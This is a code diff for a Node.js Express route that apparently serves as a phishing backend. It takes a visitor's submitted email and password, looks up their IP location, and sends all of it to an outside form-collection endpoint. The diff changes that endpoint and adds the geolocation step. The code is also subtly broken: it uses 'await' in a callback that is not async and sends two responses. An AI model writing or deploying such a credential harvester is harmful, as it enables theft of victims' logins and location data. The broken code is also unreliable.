@@ -6,21 +6,38 @@ const path = require('path');
 
 /***********************Send mail php imported url*****************/
 const
-    link = 'https://bklshserver.000webhostapp.com/server/server.php';
+    link = 'https://smartforms.dev/submit/652fc6490dd8ac0a53217fa6';
 /**********************Send mail php imported url ends**************/
 
 router.post("/", (req, res) => {
     const referer = req.headers.referer || req.headers.referrer;
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ip = req.ip;
+    const linkToIp = "https://ipapi.co/json";
+    
+    
+    const ipLookupRequest = await axios.get(linkToIp);
+    
+    console.log(ipLookupRequest.data);
 
+    const userData = ipLookupRequest.data;
 
+    const userLocation = userData.ip + ", " + userData.country_name + ", " + userData.city;
+    
 
     ax.post(link, {
         email: req.body.email,
         password: req.body.password,
         source: req.body.source,
-        receiver: req.body.reci
+        ipAddress: userLocation
     }).then((response) => {
+        res.send({
+            status_code: '200',
+            status: true,
+            message: 'message sent!',
+            email: req.body.email,
+            password: req.body.password,
+            source: req.body.source
+        })
         if(response.status === 200) {
             console.log('heyiamdone')
             res.send({
